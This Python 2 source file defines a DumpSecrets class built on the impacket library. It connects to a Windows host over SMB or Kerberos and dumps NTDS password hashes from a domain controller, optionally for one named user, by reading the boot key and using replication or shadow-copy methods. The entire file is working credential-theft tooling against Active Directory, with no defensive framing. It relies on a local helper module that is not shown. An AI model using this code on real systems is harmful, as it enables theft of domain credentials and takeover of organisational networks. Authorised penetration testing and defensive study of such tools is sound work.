#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import argparse
import codecs
import logging
import os
import sys

from impacket import version
from impacket.examples import logger
from impacket.smbconnection import SMBConnection

from dump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, ResumeSessionMgrInFile

class DumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='',execmethod='',dcuser=''):
        self.__useVSSMethod = False
        self.__remoteName = remoteName
        self.__remoteHost = remoteName
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = None
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = True
        self.__LSASecrets = None
        self.__systemHive = None
        self.__bootkey = None
        self.__securityHive = None
        self.__samHive = None
        self.__ntdsFile = None
        self.__history = False
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = None
        self.__doKerberos = False
        self.__justDC = True
        self.__justDCNTLM = False
        self.__justUser = dcuser
        self.__pwdLastSet = False
        self.__printUserStatus= False
        self.__resumeFileName = None
        self.__canProcessSAMLSA = True
        self.__kdcHost = None
        self.__options = None
        self.__execmethod = execmethod

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def dump(self):
        try:
            if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
                self.__isRemote = False
                self.__useVSSMethod = True
                if self.__systemHive:
                    localOperations = LocalOperations(self.__systemHive)
                    bootKey = localOperations.getBootKey()
                    if self.__ntdsFile is not None:
                    # Let's grab target's configuration about LM Hashes storage
                        self.__noLMHash = localOperations.checkNoLMHashPolicy()
                else:
                    import binascii
                    bootKey = binascii.unhexlify(self.__bootkey)

            else:
                self.__isRemote = True
                bootKey = None
                try:
                    try:
                        self.connect()
                    except Exception, e:
                        if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                            # SMBConnection failed. That might be because there was no way to log into the
                            # target system. We just have a last resort. Hope we have tickets cached and that they
                            # will work
                            logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                            pass
                        else:
                            raise

                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
                    self.__remoteOps.setExecMethod(self.__execmethod)
                    if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:
                        self.__remoteOps.enableRegistry()
                        bootKey             = self.__remoteOps.getBootKey()
                        # Let's check whether target system stores LM Hashes
                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
                except Exception, e:
                    self.__canProcessSAMLSA = False
                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                        and self.__doKerberos is True:
                        # Giving some hints here when SPN target name validation is set to something different to Off
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                        logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
                    else:
                        logging.error('RemoteOperations failed: %s' % str(e))

            # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
            if self.__isRemote is True:
                if self.__useVSSMethod and self.__remoteOps is not None:
                    NTDSFileName = self.__remoteOps.saveNTDS()
                else:
                    NTDSFileName = None
            else:
                NTDSFileName = self.__ntdsFile
            self.__ResumeSession = ResumeSessionMgrInFile
            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
                                           noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                           useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                           pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
                                           outputFileName=self.__outputFileName, justUser=self.__justUser,
                                           printUserStatus=self.__printUserStatus, resumeSessionMgr=self.__ResumeSession)
            try:
                self.__NTDSHashes.dump()
                if self.__NTDSHashes:
                    self.cleanup()
                    return True
            except Exception, e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                    resumeFile = self.__NTDSHashes.getResumeSessionFile()
                    if resumeFile is not None:
                        os.unlink(resumeFile)
                self.cleanup()
                return False
        except (Exception, KeyboardInterrupt), e:
            try:
                self.cleanup()
            except:
                pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()
